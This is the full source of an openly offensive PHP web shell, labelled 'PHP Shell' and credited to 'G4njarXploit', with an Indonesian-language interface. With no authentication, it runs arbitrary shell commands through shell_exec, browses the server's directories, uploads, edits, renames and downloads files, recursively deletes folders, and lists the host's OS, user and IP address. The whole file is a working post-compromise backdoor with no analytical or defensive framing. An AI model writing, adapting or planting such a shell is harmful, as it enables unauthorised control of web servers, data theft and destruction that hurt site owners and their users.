<?php
error_reporting(0);
set_time_limit(0);

$currentPath = $_GET['dir'] ?? getcwd();
chdir($currentPath);
$currentPath = getcwd();

// Fungsi hapus folder beserta isinya
function deleteFolder($folder) {
    foreach (scandir($folder) as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $folder . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteFolder($path);
        } else {
            unlink($path);
        }
    }
    rmdir($folder);
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_dir($target)) {
        deleteFolder($target);
    } elseif (is_file($target)) {
        unlink($target);
    }
    header("Location: ?dir=" . urlencode($currentPath));
    exit;
}

if (isset($_POST['renameOldPath']) && isset($_POST['newFileName'])) {
    $oldPath = $_POST['renameOldPath'];
    $newName = trim($_POST['newFileName']);
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
    if (!empty($newName) && !file_exists($newPath)) {
        rename($oldPath, $newPath);
    }
    header("Location: ?dir=" . urlencode($currentPath));
    exit;
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

$editFilePath = $_GET['edit'] ?? '';
$editFileContent = '';
if (!empty($editFilePath) && file_exists($editFilePath)) {
    $editFileContent = htmlspecialchars(file_get_contents($editFilePath));
}

if (isset($_POST['editFile']) && isset($_POST['fileContent'])) {
    file_put_contents($_POST['editFile'], $_POST['fileContent']);
    header("Location: ?dir=" . urlencode($currentPath));
    exit;
}

if (isset($_FILES['fileUpload'])) {
    $filename = basename($_FILES['fileUpload']['name']);
    move_uploaded_file($_FILES['fileUpload']['tmp_name'], $currentPath . DIRECTORY_SEPARATOR . $filename);
    header("Location: ?dir=" . urlencode($currentPath) . "&uploadSuccess=" . urlencode($filename));
    exit;
}

$commandOutput = '';
if (isset($_POST['commandInput'])) {
    $cmd = $_POST['commandInput'];
    $commandOutput = shell_exec($cmd . " 2>&1");
}

function getPerms($path) {
    return is_writable($path) ? "Writable" : "Read-Only";
}

function getColor($path) {
    return is_writable($path) ? "lime" : "red";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP Shell</title>
    <style>
        body { font-family: Arial; background: black; color: white; margin: 0; padding: 0; }
        a { color: #00f; }
        textarea, input, button { background: #111; color: lime; border: 1px solid #333; }
        table { background: #111; border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #444; padding: 4px; word-break: break-word; }
        .center-container { max-width: 900px; margin: auto; padding: 15px; }
    </style>
    <script>
        function renameFile(oldPath) {
            document.getElementById("renameArea").style.display = "block";
            document.getElementById("renameOldPath").value = oldPath;
            document.getElementById("newFileName").focus();
        }

        function toggleCommand() {
            var cmd = document.getElementById("cmdSection");
            cmd.style.display = (cmd.style.display === "none") ? "block" : "none";
        }

        function toggleUpload() {
            var up = document.getElementById("uploadForm");
            up.style.display = (up.style.display === "none") ? "block" : "none";
        }
    </script>
</head>
<body>
<div class="center-container">
    <div style="text-align:center;">
        <h2>PHP Shell</h2>
    </div>

    <table>
        <tr><th>Info</th><th>Value</th></tr>
        <tr><td>OS</td><td><?= php_uname() ?></td></tr>
        <tr><td>PHP Version</td><td><?= phpversion() ?></td></tr>
        <tr><td>Server Software</td><td><?= $_SERVER['SERVER_SOFTWARE'] ?></td></tr>
        <tr><td>IP</td><td><?= $_SERVER['SERVER_ADDR'] ?></td></tr>
        <tr><td>User</td><td><?= get_current_user() ?></td></tr>
        <tr><td>Web Root</td><td><?= getcwd() ?></td></tr>
    </table>

    <b>Path:</b><br>
    <?php
    $parts = explode(DIRECTORY_SEPARATOR, $currentPath);
    $build = "";
    foreach ($parts as $part) {
        if ($part == "") continue;
        $build .= DIRECTORY_SEPARATOR . $part;
        echo "<a href='?dir=" . urlencode($build) . "'>$part</a> \\ ";
    }
    ?>

    <div style="margin-top: 10px; margin-bottom: 20px;">
        <form method="get" style="display:inline;">
            <button type="submit" name="dir" value="<?= htmlspecialchars(__DIR__) ?>">🏠 Home</button>
        </form>
        <button onclick="toggleUpload()">📤 Upload File</button>
        <button onclick="toggleCommand()">🛠 Command</button>
    </div>

    <div id="uploadForm" style="display:none;">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="fileUpload">
            <input type="submit" value="Upload">
        </form>
        <?php if (isset($_GET['uploadSuccess'])): ?>
            <p style="color:lime;">✅ File berhasil diupload: <?= $_GET['uploadSuccess'] ?></p>
        <?php endif; ?>
        <hr>
    </div>

    <div id="cmdSection" style="display:none;">
        <form method="post">
            <input type="text" name="commandInput" style="width:60%;" placeholder="Ketik command...">
            <input type="submit" value="Jalankan">
        </form>
        <?php if (!empty($commandOutput)): ?>
            <pre style="background:#111; color:lime; padding:10px;"><?= htmlspecialchars($commandOutput) ?></pre>
        <?php endif; ?>
    </div>

    <?php if (!empty($editFilePath)): ?>
        <div>
            <h3>Edit File: <?= $editFilePath ?></h3>
            <form method="post">
                <input type="hidden" name="editFile" value="<?= $editFilePath ?>">
                <textarea name="fileContent" rows="20"><?= $editFileContent ?></textarea><br>
                <input type="submit" value="Simpan Perubahan">
            </form>
            <hr>
        </div>
    <?php endif; ?>

    <div id="renameArea" style="display:none;">
        <hr><b>Rename File/Folder:</b><br>
        <form method="post">
            <input type="hidden" id="renameOldPath" name="renameOldPath">
            <input type="text" id="newFileName" name="newFileName" placeholder="Nama baru">
            <input type="submit" value="Rename">
        </form>
    </div>

    <!-- File Manager -->
    <hr><b>File Manager:</b><br>
    <table>
        <tr><th>Nama</th><th>Ukuran</th><th>Permission</th><th>Aksi</th></tr>
        <?php
        $items = scandir(".");
        $folders = [];
        $files = [];

        foreach ($items as $item) {
            if ($item == "." || $item == "..") continue;
            if (is_dir($item)) $folders[] = $item;
            else $files[] = $item;
        }

        foreach ($folders as $item): ?>
            <tr>
                <td><a href="?dir=<?= urlencode(realpath($item)) ?>"><?= $item ?></a></td>
                <td>dir</td>
                <td style="color:<?= getColor($item) ?>;"><?= getPerms($item) ?></td>
                <td>
                    <a href="javascript:void(0);" onclick="renameFile('<?= $item ?>')">[Rename]</a>
                    <a href="?delete=<?= urlencode($item) ?>" onclick="return confirm('Hapus folder ini?')">[Delete]</a>
                </td>
            </tr>
        <?php endforeach;
        foreach ($files as $item): ?>
            <tr>
                <td><?= $item ?></td>
                <td><?= round(filesize($item) / 1024, 2) ?> KB</td>
                <td style="color:<?= getColor($item) ?>;"><?= getPerms($item) ?></td>
                <td>
                    <a href="?edit=<?= urlencode($item) ?>">[Edit]</a>
                    <a href="?download=<?= urlencode($item) ?>">[Download]</a>
                    <a href="javascript:void(0);" onclick="renameFile('<?= $item ?>')">[Rename]</a>
                    <a href="?delete=<?= urlencode($item) ?>" onclick="return confirm('Hapus file ini?')">[Delete]</a>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>

    <table style="width:100%; margin-top:30px; border-top:1px solid #444; color:#aaa;">
        <tr><td style="text-align:center; padding:10px;">Created By G4njarXploit</td></tr>
    </table>
</div>
</body>
</html>